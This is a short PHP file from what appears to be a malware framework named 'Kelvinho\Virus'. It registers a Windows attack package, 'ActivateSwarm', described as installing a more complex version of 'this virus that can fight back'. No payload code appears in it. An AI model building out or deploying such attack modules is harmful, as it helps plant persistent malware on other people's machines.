<?php

use Kelvinho\Virus\Attack\Classes;

/** @var \Kelvinho\Virus\Attack\PackageRegistrar $packageRegistrar */

$packageRegistrar->iRegister("win.oneTime.ActivateSwarm", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ActivateSwarm\\ActivateSwarm", "adv.ActivateSwarm", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Installs a more complex version of this virus that can fight back");
